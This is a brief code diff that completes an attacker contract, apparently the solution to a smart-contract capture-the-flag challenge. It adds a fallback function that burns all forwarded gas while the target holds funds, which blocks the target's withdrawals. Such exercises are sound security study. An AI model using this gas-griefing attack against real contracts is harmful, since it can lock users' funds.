@@ -10,4 +10,9 @@ contract AttackingDenial {
     }
 
     //Code me!
+
+    fallback() external payable {
+        while(Denial(contractAddress).contractBalance() > 0){
+        }
+    }
 }
